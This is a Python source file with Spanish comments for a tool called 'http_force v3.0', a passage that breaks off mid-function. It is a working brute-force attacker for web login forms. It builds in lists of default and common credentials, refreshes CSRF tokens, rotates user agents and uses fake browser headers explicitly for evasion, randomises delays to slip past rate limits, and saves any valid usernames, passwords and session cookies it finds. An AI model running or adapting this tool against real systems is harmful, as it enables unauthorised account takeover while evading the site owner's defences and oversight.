#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#http_force v3.0

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set, Any
from urllib.parse import urljoin, urlparse
import warnings

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Suprimir warnings de SSL
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


# ============================================================================
# ENUMS Y CONSTANTES
# ============================================================================

class HttpMethod(Enum):
    """Métodos HTTP soportados"""
    GET = "get"
    POST = "post"


class AttackMode(Enum):
    """Modos de ataque soportados"""
    STANDARD = "standard"
    COMBO = "combo"


class LogLevel(Enum):
    """Niveles de logging"""
    DEBUG = logging.DEBUG
    INFO = logging.INFO
    WARNING = logging.WARNING
    ERROR = logging.ERROR
    CRITICAL = logging.CRITICAL


# ============================================================================
# USER AGENTS POOL - ROTACIÓN PARA EVASIÓN
# ============================================================================

USER_AGENTS_POOL = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]

# Headers realistas para parecer navegador legítimo
REALISTIC_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"'
}


# ============================================================================
# CREDENCIALES COMUNES - PRIORIDAD ALTA
# ============================================================================

# Estas se prueban PRIMERO por su alta probabilidad
HIGH_PRIORITY_COMBOS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("administrator", "administrator"),
    ("user", "user"),
    ("guest", "guest"),
    ("test", "test"),
    ("admin", ""),
    ("root", ""),
]

# Passwords más comunes del mundo
TOP_PASSWORDS = [
    "password", "123456", "123456789", "12345678", "12345",
    "1234567", "admin", "password123", "qwerty", "abc123",
    "letmein", "welcome", "monkey", "dragon", "master",
    "123123", "1234", "admin123", "root", "pass",
]


# Configuración por defecto mejorada
DEFAULT_CONFIG = {
    "user_agent": "ROTATING",  # Especial: rotará automáticamente
    "timeout": 10,
    "max_retries": 3,
    "backoff_factor": 0.3,
    "delay_between_attempts": 0.5,
    "delay_randomization": 0.3,  # NUEVO: +/- 30% de variación
    "max_workers": 5,
    "verify_ssl": True,
    "follow_redirects": True,
    
    # NUEVO: Evasión avanzada
    "rotate_user_agents": True,
    "use_realistic_headers": True,
    "randomize_delays": True,
    "session_persistence": True,
    
    # NUEVO: Auto-throttling
    "enable_auto_throttling": True,
    "rate_limit_detection": True,
    "consecutive_errors_threshold": 5,
    "throttle_backoff_multiplier": 2.0,
    
    # Palabras clave para detección
    "success_keywords": [
        "dashboard", "logout", "bienvenido", "welcome",
        "profile", "admin panel", "sesión", "session",
        "panel de control", "signed in", "logged in",
        "successfully", "success"
    ],
    "fail_keywords": [
        "invalid", "error", "incorrect", "wrong",
        "try again", "falló", "fallo", "unauthorized",
        "denied", "failed", "incorrecto", "bad"
    ],
    
    # NUEVO: Detección de bloqueos
    "block_keywords": [
        "rate limit", "too many", "blocked", "banned",
        "captcha", "temporarily locked", "abuse",
        "suspicious activity", "rate exceeded"
    ],
    
    # Campos de formulario comunes
    "user_field_names": [
        "username", "user", "email", "login", "user_name",
        "userid", "login_name", "account", "usuario"
    ],
    "pass_field_names": [
        "password", "pass", "pwd", "passwd", "passcode",
        "contraseña", "clave"
    ],
    
    # Scoring para detección de éxito
    "score_thresholds": {
        "status_change": 2,
        "length_change": 2,
        "hash_change": 2,
        "cookies_change": 3,
        "success_keywords": 5,
        "fail_keywords": -5,
        "login_form_present": -10,
        "min_success_score": 4
    }
}


# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class FormData:
    """Datos extraídos de un formulario HTML"""
    action_url: str
    method: HttpMethod
    username_field: Optional[str] = None
    password_field: Optional[str] = None
    hidden_fields: Dict[str, str] = field(default_factory=dict)
    csrf_tokens: Dict[str, str] = field(default_factory=dict)
    
    def is_valid(self) -> bool:
        """Verifica si el formulario tiene los campos necesarios"""
        return bool(self.username_field and self.password_field)


@dataclass
class Credential:
    """Representa un par de credenciales"""
    username: str
    password: str
    priority: int = 0  # NUEVO: prioridad (más alto = se prueba primero)
    
    def __str__(self) -> str:
        return f"{self.username}:{self.password}"
    
    def __hash__(self):
        return hash((self.username, self.password))
    
    def __eq__(self, other):
        if not isinstance(other, Credential):
            return False
        return self.username == other.username and self.password == other.password


@dataclass
class AttemptResult:
    """Resultado de un intento de autenticación"""
    credential: Credential
    success: bool
    status_code: int
    response_length: int
    response_hash: str
    cookies: Dict[str, str]
    elapsed_time: float
    score: int
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    redirect_location: Optional[str] = None
    error_message: Optional[str] = None
    is_blocked: bool = False  # NUEVO: detecta si fue bloqueado
    
    def to_dict(self) -> Dict[str, Any]:
        """Convierte a diccionario para serialización"""
        d = asdict(self)
        d['credential'] = str(self.credential)
        d['timestamp'] = self.timestamp.isoformat()
        return d


@dataclass
class AttackStatistics:
    """Estadísticas del ataque"""
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    errors: int = 0
    blocked_attempts: int = 0  # NUEVO
    consecutive_errors: int = 0  # NUEVO
    current_delay: float = 0.5  # NUEVO: delay actual (cambia con throttling)
    start_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    end_time: Optional[datetime] = None
    tested_credentials: Set[str] = field(default_factory=set)
    
    def add_attempt(self, result: AttemptResult):
        """Registra un intento"""
        self.total_attempts += 1
        if result.success:
            self.successful_attempts += 1
            self.consecutive_errors = 0
        else:
            self.failed_attempts += 1
        
        if result.error_message:
            self.errors += 1
            self.consecutive_errors += 1
        else:
            self.consecutive_errors = 0
        
        if result.is_blocked:
            self.blocked_attempts += 1
        
        self.tested_credentials.add(str(result.credential))
    
    def get_duration(self) -> float:
        """Calcula la duración total del ataque"""
        end = self.end_time or datetime.now(timezone.utc)
        return (end - self.start_time).total_seconds()
    
    def get_rate(self) -> float:
        """Calcula intentos por segundo"""
        duration = self.get_duration()
        return self.total_attempts / duration if duration > 0 else 0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convierte a diccionario"""
        return {
            'total_attempts': self.total_attempts,
            'successful': self.successful_attempts,
            'failed': self.failed_attempts,
            'errors': self.errors,
            'blocked': self.blocked_attempts,
            'duration_seconds': self.get_duration(),
            'rate_per_second': self.get_rate(),
            'start_time': self.start_time.isoformat(),
            'end_time': self.end_time.isoformat() if self.end_time else None
        }


# ============================================================================
# UTILIDADES
# ============================================================================

class ColoredFormatter(logging.Formatter):
    """Formatter con colores para terminal"""
    
    COLORS = {
        'DEBUG': '\033[36m',
        'INFO': '\033[32m',
        'WARNING': '\033[33m',
        'ERROR': '\033[31m',
        'CRITICAL': '\033[35m',
        'RESET': '\033[0m'
    }
    
    def format(self, record):
        log_color = self.COLORS.get(record.levelname, self.COLORS['RESET'])
        record.levelname = f"{log_color}{record.levelname}{self.COLORS['RESET']}"
        return super().format(record)


def setup_logger(name: str, level: LogLevel = LogLevel.INFO, 
                 log_file: Optional[Path] = None) -> logging.Logger:
    """Configura un logger profesional"""
    logger = logging.getLogger(name)
    logger.setLevel(level.value)
    logger.handlers.clear()
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(level.value)
    console_formatter = ColoredFormatter(
        '%(asctime)s | %(levelname)s | %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)
    
    if log_file:
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
    
    return logger


def load_config(config_path: Optional[Path] = None) -> Dict[str, Any]:
    """Carga configuración desde archivo JSON o usa defaults"""
    config = DEFAULT_CONFIG.copy()
    
    if config_path and config_path.exists():
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                custom_config = json.load(f)
                config.update(custom_config)
        except Exception as e:
            print(f"[!] Error cargando config: {e}. Usando defaults.")
    
    return config


def get_random_user_agent() -> str:
    """Retorna un User-Agent aleatorio del pool"""
    return random.choice(USER_AGENTS_POOL)


def get_random_delay(base_delay: float, randomization: float = 0.3) -> float:
    """
    Calcula un delay aleatorio basado en un valor base
    
    Args:
        base_delay: Delay base en segundos
        randomization: Porcentaje de variación (0.3 = ±30%)
    
    Returns:
        Delay aleatorio
    """
    min_delay = base_delay * (1 - randomization)
    max_delay = base_delay * (1 + randomization)
    return random.uniform(min_delay, max_delay)


# ============================================================================
# CREDENTIAL SMART ORDERING
# ============================================================================

class CredentialOrganizer:
    """Organiza credenciales por prioridad para máxima efectividad"""
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
    
    def prioritize_credentials(self, credentials: List[Credential]) -> List[Credential]:
        """
        Ordena credenciales por probabilidad de éxito
        
        1. Primero: Combinaciones de alta prioridad conocidas
        2. Segundo: Usuarios comunes con passwords comunes
        3. Tercero: Resto de combinaciones
        
        Returns:
            Lista ordenada de credenciales
        """
        high_priority = []
        medium_priority = []
        low_priority = []
        
        for cred in credentials:
            # Alta prioridad: combos conocidos
            if (cred.username.lower(), cred.password.lower()) in [
                (u.lower(), p.lower()) for u, p in HIGH_PRIORITY_COMBOS
            ]:
                cred.priority = 100
                high_priority.append(cred)
            
            # Media prioridad: usuarios comunes con passwords comunes
            elif cred.password in TOP_PASSWORDS or cred.username in [
                "admin", "root", "administrator", "user"
            ]:
                cred.priority = 50
                medium_priority.append(cred)
            
            # Baja prioridad: resto
            else:
                cred.priority = 10
                low_priority.append(cred)
        
        # Shuffle dentro de cada grupo para no ser predecible
        random.shuffle(medium_priority)
        random.shuffle(low_priority)
        
        ordered = high_priority + medium_priority + low_priority
        
        self.logger.info(f"[+] Credenciales ordenadas:")
        self.logger.info(f"   Alta prioridad: {len(high_priority)}")
        self.logger.info(f"   Media prioridad: {len(medium_priority)}")
        self.logger.info(f"   Baja prioridad: {len(low_priority)}")
        
        return ordered


# ============================================================================
# CREDENTIAL LOADER
# ============================================================================

class CredentialLoader:
    """Carga y gestiona credenciales desde archivos"""
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        self.organizer = CredentialOrganizer(logger)
    
    def load_from_file(self, filepath: Path) -> List[str]:
        """Carga items desde archivo de texto"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                items = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            self.logger.info(f"Cargados {len(items)} items desde {filepath.name}")
            return items
        except FileNotFoundError:
            self.logger.error(f"Archivo no encontrado: {filepath}")
            return []
        except Exception as e:
            self.logger.error(f"Error leyendo {filepath}: {e}")
            return []
    
    def load_combos(self, filepath: Path) -> List[Credential]:
        """Carga credenciales desde archivo combo (formato user:pass)"""
        credentials = []
        lines = self.load_from_file(filepath)
        
        for line in lines:
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    credentials.append(Credential(parts[0], parts[1]))
        
        # Ordenar por prioridad
        credentials = self.organizer.prioritize_credentials(credentials)
        return credentials
    
    def generate_credentials(self, usernames: List[str], 
                           passwords: List[str]) -> List[Credential]:
        """Genera todas las combinaciones de usuarios y passwords"""
        credentials = []
        for username in usernames:
            for password in passwords:
                credentials.append(Credential(username, password))
        
        self.logger.info(f"Generadas {len(credentials)} combinaciones ({len(usernames)} users × {len(passwords)} passwords)")
        
        # Ordenar por prioridad
        credentials = self.organizer.prioritize_credentials(credentials)
        return credentials


# ============================================================================
# FORM ANALYZER
# ============================================================================

class FormAnalyzer:
    """Analiza formularios HTML para extraer información de login"""
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
    
    def find_login_form(self, html: str, base_url: str) -> Optional[FormData]:
        """Encuentra y analiza el formulario de login en HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_data = self._analyze_form(form, base_url)
                if form_data and form_data.is_valid():
                    return form_data
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error analizando formulario: {e}")
            return None
    
    def _analyze_form(self, form, base_url: str) -> Optional[FormData]:
        """Analiza un formulario específico"""
        try:
            action = form.get('action', '')
            action_url = urljoin(base_url, action) if action else base_url
            
            method_str = form.get('method', 'post').lower()
            method = HttpMethod.POST if method_str == 'post' else HttpMethod.GET
            
            form_data = FormData(action_url=action_url, method=method)
            
            # Buscar campos
            inputs = form.find_all('input')
            
            for input_field in inputs:
                field_name = input_field.get('name', '')
                field_type = input_field.get('type', 'text').lower()
                field_value = input_field.get('value', '')
                
                if not field_name:
                    continue
                
                # Campo de usuario - usando word boundaries con regex
                field_name_lower = field_name.lower()
                is_username_field = any(
                    re.search(rf'\b{re.escape(name)}\b', field_name_lower)
                    for name in self.config['user_field_names']
                )
                
                if is_username_field:
                    form_data.username_field = field_name
                    self.logger.debug(f"Campo usuario encontrado: {field_name}")
                
                # Campo de password
                elif field_type == 'password':
                    form_data.password_field = field_name
                    self.logger.debug(f"Campo password encontrado: {field_name}")
                elif any(
                    re.search(rf'\b{re.escape(name)}\b', field_name_lower)
                    for name in self.config['pass_field_names']
                ):
                    form_data.password_field = field_name
                    self.logger.debug(f"Campo password encontrado: {field_name}")
                
                # Campos hidden
                elif field_type == 'hidden':
                    form_data.hidden_fields[field_name] = field_value
                    
                    # CSRF tokens - mantener búsqueda más flexible para tokens
                    if any(token in field_name_lower for token in ['csrf', 'token', '_token', 'authenticity']):
                        form_data.csrf_tokens[field_name] = field_value
                        self.logger.debug(f"CSRF token encontrado: {field_name}")
            
            return form_data
            
        except Exception as e:
            self.logger.error(f"Error en _analyze_form: {e}")
            return None


# ============================================================================
# HTTP CLIENT CON EVASIÓN
# ============================================================================

class EvasiveHttpClient:
    """Cliente HTTP con técnicas de evasión avanzadas"""
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        """Crea una sesión HTTP configurada con reintentos y evasión"""
        session = requests.Session()
        
        # Configurar reintentos automáticos
        retry_strategy = Retry(
            total=self.config['max_retries'],
            backoff_factor=self.config['backoff_factor'],
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
    
    def get_headers(self) -> Dict[str, str]:
        """Genera headers realistas con rotación de User-Agent"""
        headers = REALISTIC_HEADERS.copy() if self.config.get('use_realistic_headers', True) else {}
        
        # User-Agent rotativo o fijo
        if self.config.get('rotate_user_agents', True):
            headers['User-Agent'] = get_random_user_agent()
        else:
            ua = self.config.get('user_agent', USER_AGENTS_POOL[0])
            headers['User-Agent'] = ua if ua != "ROTATING" else get_random_user_agent()
        
        return headers
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Hace una request HTTP con evasión"""
        headers = self.get_headers()
        
        # Merge con headers personalizados
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers
        
        # SSL verification
        kwargs.setdefault('verify', self.config.get('verify_ssl', True))
        
        # Timeout
        kwargs.setdefault('timeout', self.config.get('timeout', 10))
        
        # Redirects
        kwargs.setdefault('allow_redirects', self.config.get('follow_redirects', True))
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Cierra la sesión HTTP"""
        self.session.close()


# ============================================================================
# RESPONSE ANALYZER
# ============================================================================

class ResponseAnalyzer:
    """Analiza respuestas HTTP para determinar éxito/fallo"""
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.baseline_response = None
    
    def set_baseline(self, response: requests.Response):
        """Establece respuesta baseline para comparaciones"""
        self.baseline_response = {
            'status': response.status_code,
            'length': len(response.text),
            'hash': hashlib.md5(response.text.encode()).hexdigest(),
            'cookies': len(response.cookies),
            'has_login_form': self._has_login_form(response.text)
        }
        self.logger.debug(f"Baseline establecido: {self.baseline_response}")
    
    def _has_login_form(self, html: str) -> bool:
        """Verifica si el HTML contiene un formulario de login"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                inputs = form.find_all('input')
                has_password = any(inp.get('type', '').lower() == 'password' for inp in inputs)
                if has_password:
                    return True
            return False
        except:
            return False
    
    def analyze_response(self, response: requests.Response, elapsed: float) -> Tuple[int, bool]:
        """
        Analiza una respuesta y calcula score de éxito
        
        Returns:
            Tuple[score, is_blocked]
        """
        score = 0
        is_blocked = False
        response_text = response.text.lower()
        
        # Verificar si fue bloqueado
        block_keywords = self.config.get('block_keywords', [])
        for keyword in block_keywords:
            if keyword.lower() in response_text:
                is_blocked = True
                self.logger.warning(f"[!] BLOQUEO DETECTADO: '{keyword}' en respuesta")
                return -100, is_blocked
        
        thresholds = self.config['score_thresholds']
        
        if self.baseline_response:
            # Cambio en status code
            if response.status_code != self.baseline_response['status']:
                score += thresholds['status_change']
                self.logger.debug(f"Status cambió: {self.baseline_response['status']} -> {response.status_code}")
            
            # Cambio significativo en longitud
            current_length = len(response.text)
            baseline_length = self.baseline_response['length']
            if abs(current_length - baseline_length) > (baseline_length * 0.1):
                score += thresholds['length_change']
                self.logger.debug(f"Longitud cambió significativamente: {baseline_length} -> {current_length}")
            
            # Cambio en hash de contenido
            current_hash = hashlib.md5(response.text.encode()).hexdigest()
            if current_hash != self.baseline_response['hash']:
                score += thresholds['hash_change']
            
            # Nuevas cookies
            if len(response.cookies) > self.baseline_response['cookies']:
                score += thresholds['cookies_change']
                self.logger.debug(f"Cookies nuevas detectadas: {len(response.cookies)} vs {self.baseline_response['cookies']}")
            
            # Formulario de login desapareció
            has_login_now = self._has_login_form(response.text)
            if self.baseline_response['has_login_form'] and not has_login_now:
                score += abs(thresholds['login_form_present'])
                self.logger.debug("Formulario de login desapareció (buen indicador)")
            elif has_login_now:
                score += thresholds['login_form_present']
        
        # Keywords de éxito
        success_found = []
        for keyword in self.config['success_keywords']:
            if keyword.lower() in response_text:
                score += thresholds['success_keywords']
                success_found.append(keyword)
        
        if success_found:
            self.logger.debug(f"Keywords de éxito encontradas: {success_found}")
        
        # Keywords de fallo
        fail_found = []
        for keyword in self.config['fail_keywords']:
            if keyword.lower() in response_text:
                score += thresholds['fail_keywords']
                fail_found.append(keyword)
        
        if fail_found:
            self.logger.debug(f"Keywords de fallo encontradas: {fail_found}")
        
        return score, is_blocked


# ============================================================================
# BRUTE FORCE ENGINE CON EVASIÓN Y OPTIMIZACIÓN
# ============================================================================

class BruteForceEngine:
    """Motor principal de fuerza bruta con evasión avanzada"""
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.http_client = EvasiveHttpClient(config, logger)
        self.form_analyzer = FormAnalyzer(config, logger)
        self.response_analyzer = ResponseAnalyzer(config, logger)
        self.credential_loader = CredentialLoader(logger)
        
        self.target_url = None
        self.form_data = None
        self.statistics = AttackStatistics()
        self.statistics.current_delay = config['delay_between_attempts']
        
        self.found_credentials: List[AttemptResult] = []
        self.stop_attack = False
    
    def initialize_target(self, url: str) -> bool:
        """Inicializa el objetivo y extrae información del formulario"""
        self.logger.info(f"Inicializando objetivo: {url}")
        self.target_url = url
        
        try:
            # Hacer request inicial con evasión
            response = self.http_client.request('GET', url)
            
            # Establecer baseline
            self.response_analyzer.set_baseline(response)
            
            # Analizar formulario
            self.form_data = self.form_analyzer.find_login_form(response.text, url)
            
            if not self.form_data:
                self.logger.error("No se encontró formulario de login")
                return False
            
            if not self.form_data.is_valid():
                self.logger.error("Formulario encontrado pero faltan campos necesarios")
                return False
            
            self.logger.info("✓ Objetivo inicializado")
            self.logger.info(f"   Action URL: {self.form_data.action_url}")
            self.logger.info(f"   Método: {self.form_data.method.value.upper()}")
            self.logger.info(f"   Campo usuario: {self.form_data.username_field}")
            self.logger.info(f"   Campo password: {self.form_data.password_field}")
            self.logger.info(f"   Campos hidden: {len(self.form_data.hidden_fields)}")
            self.logger.info(f"   CSRF tokens: {list(self.form_data.csrf_tokens.keys())}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error inicializando objetivo: {e}")
            return False
    
    def _refresh_csrf_token(self) -> bool:
        """Refresca CSRF tokens antes de cada intento"""
        if not self.form_data or not self.form_data.csrf_tokens:
            return True
        
        try:
            response = self.http_client.request('GET', self.target_url)
            new_form = self.form_analyzer.find_login_form(response.text, self.target_url)
            
            if new_form and new_form.csrf_tokens:
                self.form_data.csrf_tokens = new_form.csrf_tokens
                self.logger.debug(f"CSRF tokens refrescados: {list(new_form.csrf_tokens.keys())}")
                return True
        except:
            pass
        
        return False
    
    def _apply_auto_throttling(self):
        """Ajusta automáticamente el delay basado en errores consecutivos"""
        if not self.config.get('enable_auto_throttling', True):
            return
        
        threshold = self.config.get('consecutive_errors_threshold', 5)
        
        if self.statistics.consecutive_errors >= threshold:
            multiplier = self.config.get('throttle_backoff_multiplier', 2.0)
            old_delay = self.statistics.current_delay
            self.statistics.current_delay *= multiplier
            
            self.logger.warning(
                f"[!] AUTO-THROTTLING: {self.statistics.consecutive_errors} errores consecutivos. "
                f"Delay: {old_delay:.2f}s → {self.statistics.current_delay:.2f}s"
            )
            
            # Reset contador
            self.statistics.consecutive_errors = 0
    
    def try_credential(self, credential: Credential) -> AttemptResult:
        """Intenta una credencial específica"""
        start_time = time.time()
        
        try:
            # Refrescar CSRF si es necesario
            self._refresh_csrf_token()
            
            # Preparar datos del formulario
            data = self.form_data.hidden_fields.copy()
            data.update(self.form_data.csrf_tokens)
            data[self.form_data.username_field] = credential.username
            data[self.form_data.password_field] = credential.password
            
            # Hacer request
            if self.form_data.method == HttpMethod.POST:
                response = self.http_client.request('POST', self.form_data.action_url, data=data)
            else:
                response = self.http_client.request('GET', self.form_data.action_url, params=data)
            
            elapsed = time.time() - start_time
            
            # Analizar respuesta
            score, is_blocked = self.response_analyzer.analyze_response(response, elapsed)
            
            # Determinar éxito
            min_score = self.config['score_thresholds']['min_success_score']
            success = score >= min_score
            
            # Crear resultado
            result = AttemptResult(
                credential=credential,
                success=success,
                status_code=response.status_code,
                response_length=len(response.text),
                response_hash=hashlib.md5(response.text.encode()).hexdigest(),
                cookies=dict(response.cookies),
                elapsed_time=elapsed,
                score=score,
                redirect_location=response.url if response.url != self.form_data.action_url else None,
                is_blocked=is_blocked
            )
            
            return result
            
        except Exception as e:
            elapsed = time.time() - start_time
            self.logger.error(f"Error probando {credential}: {e}")
            
            return AttemptResult(
                credential=credential,
                success=False,
                status_code=0,
                response_length=0,
                response_hash="",
                cookies={},
                elapsed_time=elapsed,
                score=-100,
                error_message=str(e)
            )
    
    def run_attack_sequential(self, credentials: List[Credential]) -> Optional[AttemptResult]:
        """
        Ejecuta ataque secuencial (un intento a la vez)
        Se detiene al primer éxito a menos que esté en modo follow
        """
        self.logger.info(f"Iniciando ataque secuencial con {len(credentials)} credenciales")
        
        for i, cred in enumerate(credentials, 1):
            if self.stop_attack:
                break
            
            self.logger.info(f"[{i}/{len(credentials)}] Probando: {cred}")
            
            result = self.try_credential(cred)
            self.statistics.add_attempt(result)
            
            if result.success:
                self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS ENCONTRADAS! {cred}")
                self.logger.info(f"   Score: {result.score}")
                self.logger.info(f"   Status: {result.status_code}")
                self.logger.info(f"   Cookies: {len(result.cookies)} cookies")
                
                self.found_credentials.append(result)
                self._save_individual_credential(result)
                
                # Retornar inmediatamente (modo stop-on-success)
                return result
            
            elif result.is_blocked:
                self.logger.error("[X] BLOQUEO DETECTADO - Deteniendo ataque")
                self.stop_attack = True
                break
            
            # Auto-throttling
            self._apply_auto_throttling()
            
            # Delay entre intentos (aleatorio si está habilitado)
            if i < len(credentials):
                if self.config.get('randomize_delays', True):
                    delay = get_random_delay(
                        self.statistics.current_delay,
                        self.config.get('delay_randomization', 0.3)
                    )
                else:
                    delay = self.statistics.current_delay
                
                time.sleep(delay)
        
        # Si no encontró nada
        return None
    
    def run_attack_concurrent(self, credentials: List[Credential], 
                            max_workers: int, follow_mode: bool = False) -> Optional[AttemptResult]:
        """
        Ejecuta ataque concurrente con múltiples threads
        
        Args:
            credentials: Lista de credenciales a probar
            max_workers: Número de threads concurrentes
            follow_mode: Si True, continúa buscando tras encontrar éxitos
        """
        self.logger.info(
            f"Iniciando ataque concurrente con {len(credentials)} credenciales "
            f"usando {max_workers} threads"
        )
        if follow_mode:
            self.logger.info("[+] Modo FOLLOW activado - buscará TODAS las credenciales válidas")
        
        first_success = None
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_cred = {
                executor.submit(self._try_with_delay, cred, i, len(credentials)): cred
                for i, cred in enumerate(credentials, 1)
            }
            
            # Process results as they complete
            for future in as_completed(future_to_cred):
                if self.stop_attack and not follow_mode:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                try:
                    result = future.result()
                    self.statistics.add_attempt(result)
                    
                    if result.success:
                        self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS! {result.credential}")
                        self.logger.info(f"   Score: {result.score}")
                        self.logger.info(f"   Status: {result.status_code}")
                        
                        self.found_credentials.append(result)
                        self._save_individual_credential(result)
                        
                        if not first_success:
                            first_success = result
                        
                        if not follow_mode:
                            self.stop_attack = True
                            self.logger.info("✓ Primera credencial encontrada - deteniendo ataque")
                    
                    elif result.is_blocked:
                        self.logger.error("[X] BLOQUEO DETECTADO - deteniendo ataque")
                        self.stop_attack = True
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    
                except Exception as e:
                    self.logger.error(f"Error procesando resultado: {e}")
        
        return first_success
    
    def _try_with_delay(self, credential: Credential, index: int, total: int) -> AttemptResult:
        """Intenta credencial con delay aleatorio para concurrencia"""
        self.logger.info(f"[{index}/{total}] Probando: {credential}")
        
        result = self.try_credential(credential)
        
        # Delay aleatorio
        if self.config.get('randomize_delays', True):
            delay = get_random_delay(
                self.statistics.current_delay,
                self.config.get('delay_randomization', 0.3)
            )
        else:
            delay = self.statistics.current_delay
        
        time.sleep(delay)
        return result
    
    def _save_individual_credential(self, result: AttemptResult):
        """Guarda inmediatamente una credencial exitosa"""
        try:
            output_dir = Path('./results/credentials')
            output_dir.mkdir(parents=True, exist_ok=True)
            
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
            creds_file = output_dir / f"cred_{result.credential.username}_{timestamp}.json"
            
            data = {
                'credential': str(result.credential),
                'username': result.credential.username,
                'password': result.credential.password,
                'cookies': result.cookies,
                'status_code': result.status_code,
                'response_length': result.response_length,
                'score': result.score,
                'timestamp': result.timestamp.isoformat(),
                'redirect_location': result.redirect_location,
                'elapsed_time': result.elapsed_time
            }
            
            with open(creds_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"[+] Credencial guardada: {creds_file}")
        except Exception as e:
            self.logger.error(f"Error guardando credencial: {e}")
    
    def save_results(self, result: Optional[AttemptResult], output_dir: Path):
        """Guarda estadísticas y resultados finales"""
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Guardar estadísticas
